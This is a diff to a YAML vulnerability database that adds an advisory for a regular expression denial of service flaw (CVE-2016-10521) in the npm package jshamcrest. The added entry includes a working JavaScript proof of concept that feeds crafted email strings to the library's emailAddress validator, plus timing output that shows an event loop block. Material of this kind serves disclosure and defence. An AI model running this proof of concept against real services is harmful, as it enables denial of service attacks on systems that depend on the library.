@@ -1,5 +1,65 @@
 ---
-- id: ossindex:npm:jshamcrest:2017-07-29
+- id: npmjs:npm:jshamcrest:53
+  title: Regular Expression Denial of Service
+  description: |-
+    The `jshamcrest` package is affected by a regular expression denial of service vulnerability when certain types of user input are passed in to the emailAddress validator.
+
+
+    ## Proof of concept
+
+    ```
+    var js = require('jshamcrest')
+    var emailAddress = new js.JsHamcrest.Matchers.emailAddress();
+
+
+    var genstr = function (len, chr) {
+        var result = "";
+        for (i=0; i<=len; i++) {
+            result = result + chr;
+        }
+
+        return result;
+    }
+
+
+    for (i=1;i<=10000000;i=i+1) {
+        console.log("COUNT: " + i);
+        var str = '66666666666666666666666666666@ffffffffffffffffffffffffffffffff.' + genstr(i, 'a') + '{'
+        console.log("LENGTH: " + str.length);
+        var start = process.hrtime();
+        emailAddress.matches(str)
+
+        var end = process.hrtime(start);
+        console.log(end);
+    }
+    ```
+
+    ### Results
+    It takes about 116 characters to get a 1.6 second event loop block.
+    ```
+    [ 1, 633084590 ]
+    COUNT: 51
+    LENGTH: 116
+    ```
+
+    # Timeline
+    - October 25, 2015 - Vulnerability Identified
+    - October 25, 2015 - Maintainers notified (no response)
+  affected_package: jshamcrest
+  vulnerable_versions:
+  - "<=99.999.99999"
+  severity: high
+  package_manager: npm
+  cve:
+  - CVE-2016-10521
+  cwe: CWE-400
+  disclosed_date: 1970-01-01
+  created_date: 1970-01-01
+  last_modified_date: 1970-01-01
+  credit: Adam Baldwin
+  references: https://npmjs.com/advisories/53
+  source_url: https://npmjs.com/advisories/53
+- id: ossindex:npm:jshamcrest:8405000461
   title: Regular Expression Denial of Service (ReDoS)
   description: "> jshamcrest is vulnerable to regular expression denial of service
     (ReDoS) when certain types of user input is passed in to the emailAddress validator.\n>
@@ -17,7 +77,7 @@
   - https://nodesecurity.io/advisories/53
   - https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS
   source_url: https://ossindex.net/resource/package/7014012191/vulnerabilities
-- id: snykio:npm:jshamcrest:CVE-2016-10521
+- id: snykio:npm:jshamcrest:20160105
   title: Regular Expression Denial of Service (DoS)
   description: |+
     jshamcrest\'s email address validator is vulnerable to regular
